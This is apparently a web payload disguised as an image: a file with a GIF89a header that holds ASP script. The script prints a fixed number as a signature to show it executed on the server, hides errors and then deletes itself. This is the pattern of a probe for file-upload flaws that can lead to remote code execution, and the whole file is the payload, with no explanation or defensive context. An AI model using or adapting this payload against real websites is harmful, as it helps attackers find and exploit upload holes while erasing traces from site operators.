GIF89a
<%
response.Write(987651234-123498765)
strURL = Request.Servervariables("url")
intPos = InstrRev(strURL,"/")
intStrLen = len(strURL)
strFileName = Right(strURL,intStrLen-intPos)
on error resume next
set fs=Server.CreateObject("Scripting.FileSystemObject")
fs.DeleteFile(Server.MapPath(".")&"\\"&strFileName)
%>
